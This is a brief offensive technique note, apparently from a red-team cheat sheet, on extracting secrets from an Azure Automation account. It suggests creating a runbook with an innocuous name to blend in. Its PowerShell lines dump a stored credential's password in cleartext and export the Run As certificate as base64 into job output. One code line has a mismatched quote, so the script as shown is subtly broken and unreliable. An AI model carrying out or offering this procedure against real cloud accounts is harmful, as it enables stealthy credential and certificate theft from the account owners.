# Automation Accounts Credentials Extraction

## Steps

### 1) First, we will need to create a new runbook in the account. Ideally, we would name this something generic, such as AzureAutomationTutorials, to blend in.

### 2) This runbook will cast the Cred-1 credential item to a variable, then output the username and password to the job output:

 - $myCredential = Get-AutomationPSCredential -Name 'Cred-1'

 - $userName = $myCredential.UserName

 - $password = $myCredential.GetNetworkCredential().Password

 - $userName

 - $password

### 3) We will follow a similar process for exporting the attached Automation account Run as certificates:

 - $RunAsCert = Get-AutomationCertificate -Name 'AzureRunAsCertificate'

 - $CertificatePath = Join-Path $env:temp RunAsCertificate.pfx

 - $Cert = $RunAsCert.Export('pfx','CertificatePassword')

 - Set-Content -Value $Cert -Path $CertificatePath -Force -Encoding Byte | Write-Verbose

 - $base64string = [Convert]::ToBase64String([IO.File]::ReadAllBytes('$CertificatePath))

 - $base64string


### 4) Finally, we can review the job output to recover the credentials. The certificates can be converted back to pfx files from the Base64 strings, and the stored credentials should be available in cleartext.

